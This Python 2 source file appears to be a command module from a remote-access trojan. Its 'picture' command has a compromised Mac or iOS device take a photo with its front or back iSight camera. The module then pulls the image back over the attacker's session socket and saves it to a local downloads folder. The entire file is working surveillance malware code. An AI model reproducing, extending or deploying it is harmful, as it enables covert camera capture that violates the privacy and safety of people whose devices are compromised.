import json, time, binascii, os
import modules.helper as h

class command:
    def __init__(self):
        self.name = "picture"
        self.description = "take picture through iSight"
        self.type = "native"
        self.usage = "Usage: picture front|back"

    def run(self,session,cmd_data):
		if not cmd_data['args'] or (cmd_data['args'] != "front" and cmd_data['args'] != "back"):
			print self.usage
			return
		if cmd_data['args'] == "back":
			cmd_data['args'] = False
		else:
			cmd_data['args'] = True
		h.info_general("Taking picture...")
		try:
			response = json.loads(session.send_command(cmd_data))
			if 'success' in response:
				size = int(response["size"])
				if cmd_data['args'] == False:
					file_name = "back_{0}.jpg".format(int(time.time()))
				else:
					file_name = "front_{0}.jpg".format(int(time.time()))
				data = session.sock_receive_data(size)
				h.info_general("Saving {0}".format(file_name))
				# save to file
				f = open(os.path.join('downloads',file_name),'w')
				f.write(data)
				f.close()
				h.info_general("Saved to ./downloads/{0}".format(file_name))
			else:
				if 'error' in response:
					h.info_error(response['error'])
				else:
					h.info_error("Unexpected error")
		except Exception as e:
			print e

